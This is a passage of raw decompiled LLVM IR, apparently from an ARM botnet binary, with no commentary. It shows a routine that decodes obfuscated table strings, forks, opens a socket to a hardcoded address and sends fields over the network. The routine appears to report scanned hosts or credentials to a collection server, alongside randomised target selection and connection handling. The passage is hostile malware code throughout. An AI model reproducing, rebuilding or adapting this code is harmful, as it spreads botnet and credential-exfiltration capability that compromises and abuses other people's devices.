  %v7_f8f8 = icmp eq i32 %v0_f8f8.pr, 251
  store i1 %v7_f8f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8f8, label %bb454, label %dec_label_pc_f314

bb454:                                            ; preds = %dec_label_pc_f8f8
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f900 = load i32, i32* @r4, align 4
  %v4_f900 = inttoptr i32 %v3_f900 to i8*
  store i8 -3, i8* %v4_f900, align 1
  br label %dec_label_pc_f314

dec_label_pc_f908:                                ; preds = %dec_label_pc_f7bc, %dec_label_pc_f7dc, %dec_label_pc_f7d4, %dec_label_pc_f7cc, %bb452, %dec_label_pc_f7a8, %dec_label_pc_f784, %dec_label_pc_f7a0, %dec_label_pc_f798, %bb451
  %v0_f90c = phi i32 [ %v1_f778, %dec_label_pc_f7a8 ], [ %v1_f778, %dec_label_pc_f784 ], [ %v1_f778, %dec_label_pc_f7a0 ], [ %v1_f778, %dec_label_pc_f798 ], [ %v1_f778, %bb451 ], [ %v1_f7e8, %bb452 ], [ %v1_f7e8, %dec_label_pc_f7cc ], [ %v1_f7e8, %dec_label_pc_f7d4 ], [ %v1_f7e8, %dec_label_pc_f7dc ], [ %v1_f7e8, %dec_label_pc_f7bc ]
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_f90c = add i32 %v0_f90c, 1
  store i32 %v1_f90c, i32* @r7, align 4
  %v1_f910 = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_f918 = call i32 @table_lock_val(i32 27)
  store i32 %v1_f918, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f91c

dec_label_pc_f91c:                                ; preds = %dec_label_pc_f878, %dec_label_pc_f908
  %v0_f91c = load i32, i32* @r6, align 4
  %v1_f91c = inttoptr i32 %v0_f91c to i32*
  %v2_f91c = load i32, i32* %v1_f91c, align 4
  store i32 %v2_f91c, i32* %r3.global-to-local, align 4
  %v1_f920 = add i32 %v0_f91c, 4
  %v2_f920 = inttoptr i32 %v1_f920 to i32*
  %v3_f920 = load i32, i32* %v2_f920, align 4
  store i32 %v3_f920, i32* %r0.global-to-local, align 4
  %v1_f924 = add i32 %v2_f91c, 12
  %v2_f924 = inttoptr i32 %v1_f924 to i8*
  %v3_f924 = load i8, i8* %v2_f924, align 1
  %v4_f924 = zext i8 %v3_f924 to i32
  store i32 %v4_f924, i32* %r2.global-to-local, align 4
  %v1_f928 = inttoptr i32 %v2_f91c to i32*
  %v2_f928 = load i32, i32* %v1_f928, align 4
  store i32 %v2_f928, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f930 = call i32 @__libc_send(i32 %v3_f920, i32 %v2_f928, i32 %v4_f924, i32 16384)
  store i32 %v4_f930, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f938 = load i32, i32* @r6, align 4
  %v1_f938 = add i32 %v0_f938, 4
  %v2_f938 = inttoptr i32 %v1_f938 to i32*
  %v3_f938 = load i32, i32* %v2_f938, align 4
  store i32 %v3_f938, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f944 = call i32 @__libc_send(i32 %v3_f938, i32 ptrtoint ([3 x i8]* @global_var_19070.201 to i32), i32 2, i32 16384)
  store i32 %v4_f944, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_f94c = load i32, i32* @r6, align 4
  %v2_f94c = add i32 %v1_f94c, 12
  %v3_f94c = inttoptr i32 %v2_f94c to i32*
  store i32 4, i32* %v3_f94c, align 4
  br label %dec_label_pc_f768

dec_label_pc_f954:                                ; preds = %dec_label_pc_f6c0, %dec_label_pc_f6d8, %dec_label_pc_f6d0, %bb448, %dec_label_pc_f6ac, %dec_label_pc_f690, %dec_label_pc_f6a4, %bb447
  %v0_f958 = phi i32 [ %v1_f684, %dec_label_pc_f6ac ], [ %v1_f684, %dec_label_pc_f690 ], [ %v1_f684, %dec_label_pc_f6a4 ], [ %v1_f684, %bb447 ], [ %v1_f6e4, %bb448 ], [ %v1_f6e4, %dec_label_pc_f6d0 ], [ %v1_f6e4, %dec_label_pc_f6d8 ], [ %v1_f6e4, %dec_label_pc_f6c0 ]
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_f958 = add i32 %v0_f958, 1
  store i32 %v1_f958, i32* @r7, align 4
  %v1_f95c = call i32 @table_lock_val(i32 25)
  br label %dec_label_pc_f734

dec_label_pc_f964:                                ; preds = %dec_label_pc_f070
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f970 = call i32 @table_unlock_val(i32 9)
  store i32 %v2_f804, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_f980 = call i32 @table_retrieve_val(i32 9, i32* nonnull %stack_var_-60)
  store i32 %v3_f980, i32* %r0.global-to-local, align 4
  %v3_f984 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f980, i32* %r2.global-to-local, align 4
  %v1_f98c = add i32 %v3_f984, -1
  store i32 %v1_f98c, i32* %r3.global-to-local, align 4
  %v0_f990 = load i32, i32* @r6, align 4
  %v1_f990 = add i32 %v0_f990, 24
  %v2_f990 = inttoptr i32 %v1_f990 to i32*
  %v3_f990 = load i32, i32* %v2_f990, align 4
  store i32 %v3_f990, i32* %r1.global-to-local, align 4
  %v0_f994 = load i32, i32* @sb, align 4
  store i32 %v0_f994, i32* %r0.global-to-local, align 4
  %v4_f998 = call i32 @util_memsearch(i32 %v0_f994, i32 %v3_f990, i32 %v3_f980, i32 %v1_f98c)
  store i32 %v4_f998, i32* @r7, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f9a4 = call i32 @table_lock_val(i32 9)
  store i32 %v1_f9a4, i32* %r0.global-to-local, align 4
  %v0_f9a8 = load i32, i32* @r7, align 4
  %v2_f9a8 = icmp eq i32 %v0_f9a8, -1
  store i1 %v2_f9a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f9a8 = icmp eq i32 %v0_f9a8, -1
  store i1 %v7_f9a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9a8, label %dec_label_pc_ef50.loopexit, label %dec_label_pc_f9b0

dec_label_pc_f9b0:                                ; preds = %dec_label_pc_f964
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9b0 = icmp eq i32 %v0_f9a8, 0
  store i1 %v2_f9b0, i1* %cpsr_z.global-to-local, align 1
  %tmp455 = icmp slt i32 %v0_f9a8, 1
  br i1 %tmp455, label %dec_label_pc_f768, label %dec_label_pc_f9b8

dec_label_pc_f9b8:                                ; preds = %dec_label_pc_f9b0
  %v0_f9b8 = load i32, i32* @r6, align 4
  %v1_f9b8 = add i32 %v0_f9b8, 20
  %v2_f9b8 = inttoptr i32 %v1_f9b8 to i16*
  %v3_f9b8 = load i16, i16* %v2_f9b8, align 2
  %v4_f9b8 = zext i16 %v3_f9b8 to i32
  store i32 %v4_f9b8, i32* %r3.global-to-local, align 4
  %v1_f9bc = add i32 %v0_f9b8, 16
  %v2_f9bc = inttoptr i32 %v1_f9bc to i32*
  %v3_f9bc = load i32, i32* %v2_f9bc, align 4
  store i32 %v3_f9bc, i32* %r2.global-to-local, align 4
  store i32 %v2_f9c0, i32* %ip.global-to-local, align 4
  store i32 %v4_f9b8, i32* %stack_var_-42, align 4
  store i32 %v3_f9bc, i32* %stack_var_-60, align 4
  %v1_f9cc = inttoptr i32 %v0_f9b8 to i32*
  %v2_f9cc = load i32, i32* %v1_f9cc, align 4
  store i32 %v2_f9cc, i32* @r8, align 4
  %v0_f9d0 = call i32 @__libc_fork()
  store i32 %v0_f9d0, i32* %r0.global-to-local, align 4
  %v7_f9d4 = icmp eq i32 %v0_f9d0, -1
  %.465 = zext i1 %v7_f9d4 to i32
  store i32 %.465, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9e0 = icmp eq i32 %v0_f9d0, 0
  store i1 %v2_f9e0, i1* %cpsr_z.global-to-local, align 1
  %tmp458 = icmp slt i32 %v0_f9d0, 1
  br i1 %tmp458, label %bb459, label %.thread144

.thread144:                                       ; preds = %dec_label_pc_f9b8
  store i32 1, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f9f4

bb459:                                            ; preds = %dec_label_pc_f9b8
  store i32 %.465, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9ec = icmp eq i1 %v7_f9d4, false
  store i1 %v2_f9ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9ec, label %dec_label_pc_fb7c, label %dec_label_pc_f9f4

dec_label_pc_f9f4:                                ; preds = %.thread144, %bb459
  %v0_f9f4 = load i32, i32* @r6, align 4
  %v1_f9f4 = add i32 %v0_f9f4, 4
  %v2_f9f4 = inttoptr i32 %v1_f9f4 to i32*
  %v3_f9f4 = load i32, i32* %v2_f9f4, align 4
  store i32 %v3_f9f4, i32* %r0.global-to-local, align 4
  %v1_f9f8 = call i32 @__GI___libc_close(i32 %v3_f9f4)
  store i32 %v1_f9f8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_fa00 = load i32, i32* @r4, align 4
  %v1_fa00 = load i32, i32* @r6, align 4
  %v2_fa00 = add i32 %v1_fa00, 4
  %v3_fa00 = inttoptr i32 %v2_fa00 to i32*
  store i32 %v0_fa00, i32* %v3_fa00, align 4
  %v0_fa04 = load i32, i32* @r3, align 4
  %v1_fa04 = load i32, i32* @r6, align 4
  %v2_fa04 = add i32 %v1_fa04, 12
  %v3_fa04 = inttoptr i32 %v2_fa04 to i32*
  store i32 %v0_fa04, i32* %v3_fa04, align 4
  br label %dec_label_pc_f768

dec_label_pc_fa0c:                                ; preds = %dec_label_pc_f8d8
  store i32 %v2_f898, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_fa18 = add i32 %v0_f8c4, 4
  %v2_fa18 = inttoptr i32 %v1_fa18 to i32*
  %v3_fa18 = load i32, i32* %v2_fa18, align 4
  store i32 %v3_fa18, i32* %r0.global-to-local, align 4
  %v4_fa1c = call i32 @__libc_send(i32 %v3_fa18, i32 %v2_f898, i32 3, i32 16384)
  store i32 %v4_fa1c, i32* %r0.global-to-local, align 4
  %v0_fa20 = load i32, i32* @r6, align 4
  %v1_fa20 = add i32 %v0_fa20, 4
  %v2_fa20 = inttoptr i32 %v1_fa20 to i32*
  %v3_fa20 = load i32, i32* %v2_fa20, align 4
  store i32 %v3_fa20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f360

dec_label_pc_fa30:                                ; preds = %dec_label_pc_ef5c
  store i32 %.pre282, i32* @r0, align 4
  %v1_fa38 = add i32 %v0_fa30, 92
  store i32 %v1_fa38, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_fa40 = call i32 @memmove(i32 %.pre282, i32 %v1_fa38, i32 192)
  store i32 %v3_fa40, i32* %r0.global-to-local, align 4
  %v0_fa44 = load i32, i32* @r6, align 4
  %v1_fa44 = add i32 %v0_fa44, 24
  %v2_fa44 = inttoptr i32 %v1_fa44 to i32*
  %v3_fa44 = load i32, i32* %v2_fa44, align 4
  %v1_fa48 = add i32 %v3_fa44, -64
  store i32 %v1_fa48, i32* %r3.global-to-local, align 4
  store i32 %v1_fa48, i32* %v2_fa44, align 4
  br label %dec_label_pc_ef6c

dec_label_pc_fa54:                                ; preds = %dec_label_pc_f0ac
  %v0_fa54 = load i32, i32* @r6, align 4
  store i32 %v0_fa54, i32* @r0, align 4
  %v0_fa58 = call i32 @setup_connection()
  store i32 %v0_fa58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f0e8

dec_label_pc_fa60:                                ; preds = %dec_label_pc_ef14
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_e684, i32* %r3.global-to-local, align 4
  store i32 %v2_f804, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i8 0, i8* %stack_var_-56, align 1
  %v5_fa88 = call i32 @getsockopt(i32 %v3_ef08, i32 1, i32 4, i32 %v2_e684, i32 %v2_f804)
  %v3_fa8c = load i8, i8* %stack_var_-56, align 1
  %v4_fa8c = sext i8 %v3_fa8c to i32
  store i32 %v4_fa8c, i32* %r3.global-to-local, align 4
  %v2_fa90 = or i32 %v4_fa8c, %v5_fa88
  store i32 %v2_fa90, i32* %r0.global-to-local, align 4
  %v4_fa90 = icmp eq i32 %v2_fa90, 0
  store i1 %v4_fa90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fa90, label %dec_label_pc_fa98, label %dec_label_pc_fb44

dec_label_pc_fa98:                                ; preds = %dec_label_pc_fa60
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_fa9c = load i32, i32* @r6, align 4
  %v2_fa9c = add i32 %v1_fa9c, 12
  %v3_fa9c = inttoptr i32 %v2_fa9c to i32*
  store i32 2, i32* %v3_fa9c, align 4
  %v0_faa0 = call i32 @rand_next()
  %v2_faa8 = load i16, i16* bitcast (i16** @global_var_21904.141 to i16*), align 4
  %v3_faa8 = zext i16 %v2_faa8 to i32
  %v2_faac = udiv i32 %v0_faa0, %v3_faa8
  %v3_faac = urem i32 %v0_faa0, %v3_faa8
  store i32 %v2_faac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_218d4.137 to i32), i32* %r3.global-to-local, align 4
  %v2_fab4 = load i32, i32* @global_var_218d4.137, align 4
  store i32 %v2_fab4, i32* %ip.global-to-local, align 4
  %v1_fabc = load i32, i32* @r4, align 4
  %v9_fabc = icmp eq i32 %v2_fab4, %v1_fabc
  store i1 %v9_fabc, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_faac, i32* %r1.global-to-local, align 4
  %v7_fac4 = icmp sgt i32 %v2_fab4, %v1_fabc
  br i1 %v7_fac4, label %dec_label_pc_fac8, label %dec_label_pc_fb08

dec_label_pc_fac8:                                ; preds = %dec_label_pc_fa98
  %v2_facc = load i32, i32* @global_var_21900.139, align 4
  store i32 %v2_facc, i32* %r3.global-to-local, align 4
  store i32 %v1_fabc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fae8

dec_label_pc_fad8:                                ; preds = %dec_label_pc_faf8, %dec_label_pc_fae8
  %v1_fad8 = add i32 %v0_fad8, 1
  store i32 %v1_fad8, i32* %r2.global-to-local, align 4
  %v9_fadc = icmp eq i32 %v1_fad8, %v2_fab4
  %v1_fae0 = add i32 %v0_fae0, 16
  store i32 %v1_fae0, i32* %r3.global-to-local, align 4
  br i1 %v9_fadc, label %dec_label_pc_fb08.loopexit, label %dec_label_pc_fae8

dec_label_pc_fae8:                                ; preds = %dec_label_pc_fad8, %dec_label_pc_fac8
  %v0_fad8 = phi i32 [ %v1_fad8, %dec_label_pc_fad8 ], [ %v1_fabc, %dec_label_pc_fac8 ]
  %v0_fae0 = phi i32 [ %v1_fae0, %dec_label_pc_fad8 ], [ %v2_facc, %dec_label_pc_fac8 ]
  store i32 %v0_fae0, i32* %r0.global-to-local, align 4
  %v1_faec = add i32 %v0_fae0, 8
  %v2_faec = inttoptr i32 %v1_faec to i16*
  %v3_faec = load i16, i16* %v2_faec, align 2
  %v4_faec = zext i16 %v3_faec to i32
  store i32 %v4_faec, i32* %r3.global-to-local, align 4
  %tmp460 = icmp ugt i32 %v4_faec, %v3_faac
  br i1 %tmp460, label %dec_label_pc_fad8, label %dec_label_pc_faf8

dec_label_pc_faf8:                                ; preds = %dec_label_pc_fae8
  %v1_faf8 = add i32 %v0_fae0, 10
  %v2_faf8 = inttoptr i32 %v1_faf8 to i16*
  %v3_faf8 = load i16, i16* %v2_faf8, align 2
  %v4_faf8 = zext i16 %v3_faf8 to i32
  store i32 %v4_faf8, i32* %r3.global-to-local, align 4
  %v3_fafc = icmp uge i32 %v4_faf8, %v3_faac
  %v9_fafc = icmp eq i32 %v4_faf8, %v3_faac
  %v2_fb00 = xor i1 %v3_fafc, true
  %v3_fb00 = or i1 %v9_fafc, %v2_fb00
  br i1 %v3_fb00, label %dec_label_pc_fad8, label %dec_label_pc_fb0c.loopexit

dec_label_pc_fb08.loopexit:                       ; preds = %dec_label_pc_fad8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb08

dec_label_pc_fb08:                                ; preds = %dec_label_pc_fb08.loopexit, %dec_label_pc_fa98
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fb0c

dec_label_pc_fb0c.loopexit:                       ; preds = %dec_label_pc_faf8
  store i1 %v3_fafc, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb0c

dec_label_pc_fb0c:                                ; preds = %dec_label_pc_fb0c.loopexit, %dec_label_pc_fb08
  %v0_fb20 = phi i32 [ %v0_fae0, %dec_label_pc_fb0c.loopexit ], [ 0, %dec_label_pc_fb08 ]
  %v0_fb0c = load i32, i32* @r6, align 4
  %v1_fb0c = add i32 %v0_fb0c, 4
  %v2_fb0c = inttoptr i32 %v1_fb0c to i32*
  %v3_fb0c = load i32, i32* %v2_fb0c, align 4
  %v3_fb10 = udiv i32 %v3_fb0c, 32
  store i32 %v3_fb10, i32* %r2.global-to-local, align 4
  %v1_fb14 = urem i32 %v3_fb0c, 32
  store i32 %v1_fb14, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_fb18 = mul nuw nsw i32 %v3_fb10, 4
  store i32 %v3_fb18, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_fb20 = inttoptr i32 %v0_fb0c to i32*
  store i32 %v0_fb20, i32* %v2_fb20, align 4
  %v0_fb24 = load i32, i32* %r3.global-to-local, align 4
  %v1_fb24 = load i32, i32* @r6, align 4
  %v2_fb24 = add i32 %v1_fb24, 24
  %v3_fb24 = inttoptr i32 %v2_fb24 to i32*
  store i32 %v0_fb24, i32* %v3_fb24, align 4
  %v0_ef3c.pre = load i32, i32* @ip, align 4
  %v1_ef44.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ef38

dec_label_pc_fb2c:                                ; preds = %dec_label_pc_f850
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_fb30 = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_fb38 = call i32 @table_lock_val(i32 27)
  store i32 %v1_fb38, i32* %r0.global-to-local, align 4
  %v0_fb3c = load i32, i32* @r6, align 4
  %v1_fb3c = add i32 %v0_fb3c, 12
  %v2_fb3c = inttoptr i32 %v1_fb3c to i32*
  %v3_fb3c = load i32, i32* %v2_fb3c, align 4
  store i32 %v3_fb3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ef54.backedge

dec_label_pc_fb44:                                ; preds = %dec_label_pc_fa60
  %v0_fb44 = load i32, i32* @r6, align 4
  %v1_fb44 = add i32 %v0_fb44, 4
  %v2_fb44 = inttoptr i32 %v1_fb44 to i32*
  %v3_fb44 = load i32, i32* %v2_fb44, align 4
  store i32 %v3_fb44, i32* %r0.global-to-local, align 4
  %v1_fb48 = call i32 @__GI___libc_close(i32 %v3_fb44)
  store i32 %v1_fb48, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_fb50 = load i32, i32* @r4, align 4
  %v1_fb50 = load i32, i32* @r6, align 4
  %v2_fb50 = add i32 %v1_fb50, 12
  %v3_fb50 = inttoptr i32 %v2_fb50 to i32*
  store i32 %v0_fb50, i32* %v3_fb50, align 4
  %v0_fb54 = load i32, i32* %r3.global-to-local, align 4
  %v1_fb54 = load i32, i32* @r6, align 4
  %v2_fb54 = add i32 %v1_fb54, 4
  %v3_fb54 = inttoptr i32 %v2_fb54 to i32*
  store i32 %v0_fb54, i32* %v3_fb54, align 4
  %v0_fb58 = load i32, i32* @r4, align 4
  %v1_fb58 = trunc i32 %v0_fb58 to i8
  %v2_fb58 = load i32, i32* @r6, align 4
  %v3_fb58 = add i32 %v2_fb58, 284
  %v4_fb58 = inttoptr i32 %v3_fb58 to i8*
  store i8 %v1_fb58, i8* %v4_fb58, align 1
  br label %dec_label_pc_f058

dec_label_pc_fb60:                                ; preds = %dec_label_pc_f008
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_fb64 = load i32, i32* @fp, align 4
  %v2_fb64 = inttoptr i32 %v1_fb64 to i32*
  store i32 104, i32* %v2_fb64, align 4
  br label %dec_label_pc_f020

dec_label_pc_fb6c:                                ; preds = %thread-pre-split124
  store i32 %v1_fb70, i32* %r0.global-to-local, align 4
  %v0_fb74 = load i32, i32* @r6, align 4
  %v1_fb74 = add i32 %v0_fb74, 12
  %v2_fb74 = inttoptr i32 %v1_fb74 to i32*
  %v3_fb74 = load i32, i32* %v2_fb74, align 4
  store i32 %v3_fb74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ef54.backedge

dec_label_pc_ef54.backedge.thread:                ; preds = %dec_label_pc_f114, %dec_label_pc_f1e8, %dec_label_pc_f38c, %dec_label_pc_f460, %dec_label_pc_f5ac
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef5c

dec_label_pc_ef54.backedge.thread561:             ; preds = %dec_label_pc_f4c4, %dec_label_pc_f3f0, %dec_label_pc_f610, %dec_label_pc_f24c, %dec_label_pc_f178
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef5c

dec_label_pc_ef54.backedge:                       ; preds = %dec_label_pc_efd0, %dec_label_pc_fb6c, %dec_label_pc_fb2c
  %v0_ef5c228 = phi i32 [ %v0_fb3c, %dec_label_pc_fb2c ], [ %v0_fb74, %dec_label_pc_fb6c ], [ %v0_efd0, %dec_label_pc_efd0 ]
  %v0_ef54.be = phi i32 [ %v3_fb3c, %dec_label_pc_fb2c ], [ %v3_fb74, %dec_label_pc_fb6c ], [ %v3_efd0, %dec_label_pc_efd0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef54 = icmp eq i32 %v0_ef54.be, 0
  store i1 %v2_ef54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef54, label %dec_label_pc_f058, label %dec_label_pc_ef5c

dec_label_pc_fb7c:                                ; preds = %bb459
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_fb88 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_fb88, i32* %r0.global-to-local, align 4
  %v2_fb8c = icmp eq i32 %v3_fb88, -1
  store i1 %v2_fb8c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb8c = icmp eq i32 %v3_fb88, -1
  store i1 %v7_fb8c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_fb88, i32* @r4, align 4
  br i1 %v7_fb8c, label %dec_label_pc_fc10, label %dec_label_pc_fb98

dec_label_pc_fb98:                                ; preds = %dec_label_pc_fb7c
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_fb9c = call i32 @table_unlock_val(i32 2)
  store i32 %v2_f9c0, i32* @lr, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_18fcc.88 to i32), i32* @r0, align 4
  %v2_fbb0 = call i32 @inet_addr(i32 ptrtoint ([15 x i8]* @global_var_18fcc.88 to i32))
  %v0_fbb4 = load i32, i32* @r5, align 4
  store i32 %v0_fbb4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_fbc0 = inttoptr i32 %v0_fbb4 to i32*
  %v3_fbc0 = call i32 @table_retrieve_val(i32 2, i32* %v2_fbc0)
  store i32 %v2_f9c0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_fbd4 = call i32 @table_lock_val(i32 2)
  %v0_fbdc = load i32, i32* @r4, align 4
  store i32 %v0_fbdc, i32* %r0.global-to-local, align 4
  store i32 %v2_e890, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_fbe8 = call i32 @__libc_connect(i32 %v0_fbdc, i32 %v2_e890, i32 16)
  store i32 %v3_fbe8, i32* %r0.global-to-local, align 4
  %v3_fbec = icmp eq i32 %v3_fbe8, -1
  store i1 %v3_fbec, i1* %cpsr_c.global-to-local, align 1
  %v8_fbec = icmp eq i32 %v3_fbe8, -1
  store i1 %v8_fbec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_fbec, label %dec_label_pc_fbf4, label %dec_label_pc_fc18

dec_label_pc_fbf4:                                ; preds = %dec_label_pc_fb98
  %v0_fbf4 = load i32, i32* @r4, align 4
  store i32 %v0_fbf4, i32* %r0.global-to-local, align 4
  %v1_fbf8 = call i32 @__GI___libc_close(i32 %v0_fbf4)
  %v0_fbfc = load i32, i32* @r5, align 4
  store i32 %v0_fbfc, i32* %r0.global-to-local, align 4
  %v1_fc00 = call i32 @__GI_exit(i32 %v0_fbfc)
  store i32 %v1_fc00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc04

dec_label_pc_fc04:                                ; preds = %dec_label_pc_e660, %dec_label_pc_fbf4
  store i32 ptrtoint (i32* @global_var_243f0.149 to i32), i32* %ip.global-to-local, align 4
  %v2_fc08 = load i32, i32* @global_var_243f0.149, align 4
  store i32 %v2_fc08, i32* %r0.global-to-local, align 4
  %v1_fc0c = call i32 @__GI___libc_close(i32 %v2_fc08)
  store i32 %v1_fc0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc10

dec_label_pc_fc10:                                ; preds = %dec_label_pc_e63c.dec_label_pc_fc10_crit_edge, %dec_label_pc_fb7c, %dec_label_pc_fc18, %dec_label_pc_fc04
  %.pre.pre-phi = phi i32 [ %.pre283, %dec_label_pc_e63c.dec_label_pc_fc10_crit_edge ], [ %v2_e684, %dec_label_pc_fb7c ], [ %v2_fc18.pre-phi, %dec_label_pc_fc18 ], [ %v2_e684, %dec_label_pc_fc04 ]
  %v0_fc10 = load i32, i32* @r5, align 4
  store i32 %v0_fc10, i32* %r0.global-to-local, align 4
  %v1_fc14 = call i32 @__GI_exit(i32 %v0_fc10)
  store i32 %v1_fc14, i32* %r0.global-to-local, align 4
  %.pre281 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_fc18

dec_label_pc_fc18:                                ; preds = %dec_label_pc_fb98, %dec_label_pc_fc10
  %v2_fc38.pre-phi = phi i32 [ %v2_f804, %dec_label_pc_fb98 ], [ %.pre281, %dec_label_pc_fc10 ]
  %v2_fc18.pre-phi = phi i32 [ %v2_e684, %dec_label_pc_fb98 ], [ %.pre.pre-phi, %dec_label_pc_fc10 ]
  store i32 %v2_fc18.pre-phi, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fc24 = load i32, i32* @r4, align 4
  store i32 %v0_fc24, i32* %r0.global-to-local, align 4
  %v0_fc28 = load i32, i32* @r5, align 4
  %v6_fc28 = trunc i32 %v0_fc28 to i8
  store i8 %v6_fc28, i8* %stack_var_-56, align 1
  %v6_fc2c = call i32 @__libc_send(i32 %v0_fc24, i32 %v2_fc18.pre-phi, i32 1, i32 16384)
  %v0_fc34 = load i32, i32* @r4, align 4
  store i32 %v0_fc34, i32* %r0.global-to-local, align 4
  store i32 %v2_fc38.pre-phi, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc44 = call i32 @__libc_send(i32 %v0_fc34, i32 %v2_fc38.pre-phi, i32 4, i32 16384)
  %v0_fc4c = load i32, i32* @r4, align 4
  store i32 %v0_fc4c, i32* %r0.global-to-local, align 4
  %v2_fc50 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_fc50, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc5c = call i32 @__libc_send(i32 %v0_fc4c, i32 %v2_fc50, i32 2, i32 16384)
  %v0_fc60 = load i32, i32* @r8, align 4
  %v1_fc60 = add i32 %v0_fc60, 12
  store i32 %v1_fc60, i32* %r1.global-to-local, align 4
  %v0_fc64 = load i32, i32* @r4, align 4
  store i32 %v0_fc64, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fc70 = call i32 @__libc_send(i32 %v0_fc64, i32 %v1_fc60, i32 1, i32 16384)
  store i32 %v4_fc70, i32* %r0.global-to-local, align 4
  %v0_fc74 = load i32, i32* @r8, align 4
  %v1_fc74 = inttoptr i32 %v0_fc74 to i32*
  %v2_fc74 = load i32, i32* %v1_fc74, align 4
  store i32 %v2_fc74, i32* %r1.global-to-local, align 4
  %v1_fc78 = add i32 %v0_fc74, 12
